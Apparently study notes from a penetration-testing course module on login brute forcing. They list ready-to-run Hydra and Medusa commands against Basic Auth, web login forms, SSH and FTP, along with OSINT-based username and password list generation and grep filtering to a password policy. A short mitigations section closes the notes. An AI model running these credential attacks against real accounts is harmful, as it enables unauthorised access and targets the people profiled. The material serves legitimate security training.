# Login Brute Forcing

## 🎯 Main Idea
- Brute forcing is a trial-and-error method to crack passwords, credentials, or keys by systematically trying combinations.
- Success depends on password complexity, attacker compute power, and defensive controls.
- Module focuses on automating credential attacks with **Hydra** and **Medusa** against Basic Auth, login forms, and network services (SSH/FTP).
- Covers generating targeted usernames/passwords and filtering wordlists to a password policy.

## 💥 Attack / Exploit Vectors

### Brute-Force Attack Types
- Choosing the right strategy for the target situation.
- `Simple` (all char combos), `Dictionary` (common password list), `Hybrid` (dict word + appended numbers/symbols).
- `Credential Stuffing` (reused leaked creds), `Password Spraying` (one common pass vs many accounts to dodge lockout).
- `Rainbow Table` (precomputed hashes), `Reverse` (one pass vs many users), `Distributed` (spread across machines).

### Default Credentials
- Devices/software ship with well-known pre-set username/password pairs (e.g. admin/admin, cisco/cisco, ubnt/ubnt).
- Always try defaults first before brute forcing.

### Basic HTTP Authentication (Hydra)
- Server challenges with `401` + `WWW-Authenticate`; browser sends `Authorization: Basic <base64(user:pass)>`.
- Brute force with Hydra's `http-get` module against the protected path.
- **Commands**
  - `hydra -l basic-auth-user -P 2023-200_most_used_passwords.txt 127.0.0.1 http-get / -s 81` — brute-force Basic Auth on port 81
  - `hydra -l admin -P /path/to/password_list.txt ftp://192.168.1.100` — FTP login brute force
  - `hydra -l root -P /path/to/password_list.txt ssh://192.168.1.100` — SSH login brute force

### Login Form Brute Force (Hydra http-post-form)
- Inspect form (method, field names) via DevTools/Burp, then build the `path:params:condition` string.
- Failure condition `F=` (error string) or success condition `S=` (status `302` / keyword like `Dashboard`).
- **Commands**
  - `hydra -L top-usernames-shortlist.txt -P 2023-200_most_used_passwords.txt -f IP -s 5000 http-post-form "/:username=^USER^&password=^PASS^:F=Invalid credentials"` — brute-force login form
  - `hydra -l admin -P /path/to/password_list.txt 127.0.0.1 http-post-form "/login.php:user=^USER^&pass=^PASS^:F=incorrect"` — POST form with failure string
  - `hydra ... http-post-form "/login:user=^USER^&pass=^PASS^:S=302"` — treat 302 redirect as success

### Web Services Brute Force (Medusa)
- Target SSH/FTP; pivot by enumerating open ports (`netstat`, `nmap`) after initial access.
- **Commands**
  - `medusa -h <IP> -n <PORT> -u sshuser -P 2023-200_most_used_passwords.txt -M ssh -t 3` — SSH brute force, 3 threads
  - `medusa -h 127.0.0.1 -u ftpuser -P passwords.txt -M ftp -t 5` — FTP brute force
  - `medusa -h www.example.com -U users.txt -P passwords.txt -M http -m GET` — HTTP Basic Auth brute force
  - `medusa -h 192.168.1.100 -u admin -P passwords.txt -M ssh -f` — stop after first valid login (`-f`)
  - `ssh sshuser@<IP> -p PORT` — connect with recovered SSH creds
  - `ftp ftp://ftpuser:<PASSWORD>@localhost` — connect with recovered FTP creds

### Custom Wordlist Generation
- Build targeted username/password lists from OSINT about the victim.
- **Commands**
  - `username-anarchy Jane Smith` — generate candidate usernames from a name
  - `username-anarchy -i names.txt` — generate usernames from a names file
  - `username-anarchy -@ example.com` — append @example.com suffix
  - `cupp -i` — interactive personalized password profiler
  - `cupp -w profiles.txt` — wordlist from a profile file
  - `cupp -l` — download popular lists (e.g. rockyou.txt)

### Password Policy Filtering (grep)
- Trim a wordlist to only passwords matching the target's policy to cut attack time.
- **Commands**
  - `grep -E '^.{8,}$' wordlist.txt` — keep words of 8+ characters
  - `grep -E '[A-Z]' wordlist.txt` — keep words with an uppercase letter
  - `grep -E '[0-9]' wordlist.txt` — keep words with a digit
  - `grep -v -i 'password' wordlist.txt` — exclude words containing "password"
  - `grep -E '^.{8,}$' wordlist.txt | grep -E '[A-Z]'` — chain multiple policy requirements

## 🛠️ Key Tools & Concepts
- **Hydra** — fast parallel network login cracker; many protocols incl. http-get/http-post-form.
- **Medusa** — modular massively-parallel brute-forcer (ssh, ftp, rdp, http...).
- **username-anarchy** — username permutation generator from real names.
- **CUPP** — Common User Passwords Profiler for personalized lists.
- **SecLists** — wordlist collection (usernames, common passwords).
- **Placeholders** — Hydra `^USER^`/`^PASS^`; Medusa modules via `-M`.

## 🛡️ Mitigations
- Enforce strong, unique passwords and avoid default/reused credentials.
- Apply account lockout / rate limiting and MFA.
- Never transmit credentials in cleartext (avoid plain FTP/Basic Auth over HTTP).
